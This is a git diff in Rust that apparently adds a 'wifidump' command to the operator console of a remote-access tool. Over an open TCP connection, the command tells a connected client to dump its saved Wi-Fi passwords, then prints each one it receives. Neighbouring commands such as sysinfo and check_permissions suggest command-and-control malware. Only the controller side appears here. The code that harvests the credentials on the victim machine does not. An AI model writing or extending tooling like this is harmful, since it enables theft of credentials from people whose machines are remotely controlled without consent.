@@ -137,6 +137,40 @@ pub fn sysinfo(conn: &mut TcpStream) -> Result<bool, String> {
     Ok(true)
 }
 
+pub fn wifidump(conn: &mut TcpStream) -> Result<bool, String> {
+    let msg = InstructMessage::WifiDump;
+    match send_message(conn, &msg) {
+        Ok(_) => (),
+        Err(e) => {
+            println!(
+                "\n\t{DIM}[{RESET}{RED}wifidump{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
+                e
+            );
+            return Ok(true);
+        }
+    };
+
+    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;
+    match msg {
+        ClientMessage::WifiDump(wifi_passwords) => {
+            println!();
+            for wifi in &wifi_passwords {
+                println!("{}", wifi);
+                println!("{}", "-".repeat(40));
+            }
+            println!();
+        }
+        ClientMessage::Error(err) => {
+            println!("client error: {err}");
+        }
+        _ => {
+            println!("unexpected client message");
+        }
+    }
+
+    Ok(true)
+}
+
 pub fn check_permissions(conn: &mut TcpStream) -> Result<bool, String> {
     let msg = InstructMessage::Check;
     match send_message(conn, &msg) {
